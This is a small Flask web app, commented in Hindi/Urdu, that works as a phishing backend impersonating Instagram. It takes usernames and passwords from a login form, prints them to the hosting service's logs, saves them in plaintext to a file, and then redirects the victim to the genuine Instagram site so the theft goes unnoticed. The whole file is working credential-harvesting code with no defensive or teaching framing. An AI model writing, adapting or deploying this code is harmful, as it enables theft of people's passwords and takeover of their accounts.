from flask import Flask, render_template, request, redirect
import os

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Ye line data ko Render ke LOGS mein dikhayegi (FREE!)
    print(f"\n\n--- NEW LOGIN ---")
    print(f"USERNAME: {username}")
    print(f"PASSWORD: {password}")
    print(f"------------------\n")

    # Data ko file mein bhi save karega
    with open("logins.txt", "a") as f:
        f.write(f"User: {username} | Pass: {password}\n")
        
    # Login ke baad asli Instagram par bhej dega
    return redirect("https://www.instagram.com")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
